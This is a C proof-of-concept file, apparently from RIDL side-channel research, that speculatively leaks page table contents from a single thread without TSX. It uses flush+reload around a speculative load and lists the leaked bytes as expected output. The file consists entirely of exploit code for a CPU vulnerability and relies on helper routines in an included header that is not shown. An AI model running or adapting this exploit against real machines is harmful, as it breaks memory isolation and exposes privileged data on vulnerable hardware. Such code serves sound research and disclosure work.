/*
Leak page tables from a single thread, without TSX.

Notes:

Expected output:
$ ./pgtable_leak_notsx | sort -n
offset 11:
00001232: 89 (?)
00001563: ba (?)
00001639: b4 (?)
00001892: 2c (,)
00003302: ff (?)
00003451: 01 (?)
00003869: 67 (g)
*/
#define ITERS 100000

#define START 11
#define END 12

#include "ridl.h"

int main(int argc, char *argv[]) {
	(void)argc; (void)argv;

	enable_SSBM();

	ALLOC_BUFFERS();
	
	for (size_t offset = START; offset < END; offset ++) {
		memset(results, 0, sizeof(results));

		enable_alignment_checks();
		for (size_t i = 0; i < ITERS; ++i) {
			flush(reloadbuffer);
			asm volatile("mfence\n");
			speculate_leak_clflush(leak + offset, reloadbuffer, leak);
			reload(reloadbuffer, results);
		}
		disable_alignment_checks();

		printf("offset %d:\n", (int)offset);
		print_results(results);
	}
}

